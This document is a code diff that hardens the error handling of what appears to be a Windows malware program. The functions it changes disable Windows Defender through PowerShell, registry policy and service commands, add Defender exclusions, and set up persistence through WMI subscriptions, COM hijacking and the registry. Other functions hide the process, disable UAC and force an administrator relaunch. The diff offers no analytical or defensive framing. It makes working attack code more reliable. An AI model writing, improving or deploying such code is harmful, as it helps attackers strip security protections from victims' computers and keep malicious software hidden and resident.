@@ -357,7 +357,7 @@ def is_admin():
     if WINDOWS_AVAILABLE:
         try:
             return ctypes.windll.shell32.IsUserAnAdmin()
-        except:
+        except (AttributeError, OSError):
             return False
     else:
         return os.geteuid() == 0
@@ -1508,6 +1508,10 @@ def disable_defender_registry():
 
 def disable_defender_powershell():
     """Disable Windows Defender via PowerShell commands."""
+    if not WINDOWS_AVAILABLE:
+        print("PowerShell Defender disable: Windows not available")
+        return False
+        
     try:
         powershell_commands = [
             'Set-MpPreference -DisableRealtimeMonitoring $true',
@@ -1526,8 +1530,12 @@ def disable_defender_powershell():
             try:
                 subprocess.run([
                     'powershell.exe', '-Command', cmd
-                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
-            except:
+                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10, 
+                   capture_output=True, text=True)
+            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
+                continue
+            except Exception as e:
+                print(f"PowerShell command failed: {e}")
                 continue
         
         # Add exclusions for common paths
@@ -1543,8 +1551,12 @@ def disable_defender_powershell():
                 subprocess.run([
                     'powershell.exe', '-Command',
                     f'Add-MpPreference -ExclusionPath "{path}"'
-                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
-            except:
+                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
+                   capture_output=True, text=True)
+            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
+                continue
+            except Exception as e:
+                print(f"PowerShell exclusion failed: {e}")
                 continue
         
         return True
@@ -1555,6 +1567,10 @@ def disable_defender_powershell():
 
 def disable_defender_group_policy():
     """Disable Windows Defender via Group Policy modifications."""
+    if not WINDOWS_AVAILABLE:
+        print("Group Policy Defender disable: Windows not available")
+        return False
+        
     try:
         import winreg
         
@@ -1571,7 +1587,10 @@ def disable_defender_group_policy():
                 key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                 winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                 winreg.CloseKey(key)
-            except:
+            except (PermissionError, OSError, FileNotFoundError):
+                continue
+            except Exception as e:
+                print(f"Registry key modification failed: {e}")
                 continue
         
         return True
@@ -1582,6 +1601,10 @@ def disable_defender_group_policy():
 
 def disable_defender_service():
     """Disable Windows Defender services."""
+    if not WINDOWS_AVAILABLE:
+        print("Service Defender disable: Windows not available")
+        return False
+        
     try:
         services_to_disable = [
             'WinDefend',
@@ -1597,13 +1620,18 @@ def disable_defender_service():
                 # Stop service
                 subprocess.run([
                     'sc.exe', 'stop', service
-                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
+                   capture_output=True, text=True)
                 
                 # Disable service
                 subprocess.run([
                     'sc.exe', 'config', service, 'start=', 'disabled'
-                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
-            except:
+                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
+                   capture_output=True, text=True)
+            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
+                continue
+            except Exception as e:
+                print(f"Service disable failed for {service}: {e}")
                 continue
         
         return True
@@ -1845,6 +1873,10 @@ def setup_scheduled_task_persistence():
 
 def setup_wmi_persistence():
     """Setup persistence via WMI event subscription."""
+    if not WINDOWS_AVAILABLE:
+        print("WMI persistence: Windows not available")
+        return False
+        
     try:
         current_exe = os.path.abspath(__file__)
         if current_exe.endswith('.py'):
@@ -1869,16 +1901,24 @@ $WMIEventBinding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "
         
         subprocess.run([
             'powershell.exe', '-Command', wmi_script
-        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        ], creationflags=subprocess.CREATE_NO_WINDOW, 
+           capture_output=True, text=True, timeout=30)
         
         return True
         
+    except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
+        print("WMI persistence: PowerShell execution failed")
+        return False
     except Exception as e:
         print(f"WMI persistence failed: {e}")
         return False
 
 def setup_com_hijacking_persistence():
     """Setup persistence via COM hijacking."""
+    if not WINDOWS_AVAILABLE:
+        print("COM hijacking persistence: Windows not available")
+        return False
+        
     try:
         import winreg
         
@@ -1897,6 +1937,9 @@ def setup_com_hijacking_persistence():
         
         return True
         
+    except (PermissionError, OSError, FileNotFoundError):
+        print("COM hijacking persistence: Registry access failed")
+        return False
     except Exception as e:
         print(f"COM hijacking persistence failed: {e}")
         return False
@@ -1975,7 +2018,11 @@ def hide_process():
         process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
         
         # Try to hide from process list (limited effectiveness)
-        ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1, -1)
+        try:
+            ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1, -1)
+        except (AttributeError, OSError):
+            # ctypes.windll might not be available or the call might fail
+            pass
         
         return True
         
@@ -1989,6 +2036,8 @@ def disable_uac():
         return False
     
     try:
+        import winreg
+        
         reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
         with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
             winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
@@ -1998,6 +2047,9 @@ def disable_uac():
         return True
     except PermissionError:
         print("[!] Access denied. Run this script as administrator.")
+        return False
+    except (OSError, FileNotFoundError):
+        print("[!] Registry access failed.")
         return False
     except Exception as e:
         print(f"[!] Error disabling UAC: {e}")
@@ -2016,6 +2068,9 @@ def run_as_admin():
                 None, "runas", sys.executable, f'"{__file__}"', None, 1
             )
             sys.exit()
+        except (AttributeError, OSError):
+            print("[!] Failed to relaunch as admin: Windows API not available")
+            return False
         except Exception as e:
             print(f"[!] Failed to relaunch as admin: {e}")
             return False
@@ -2046,6 +2101,9 @@ def setup_persistence():
         
         return True
         
+    except (PermissionError, OSError, FileNotFoundError):
+        print("Failed to setup persistence: Registry access denied")
+        return False
     except Exception as e:
         print(f"Failed to setup persistence: {e}")
         return False
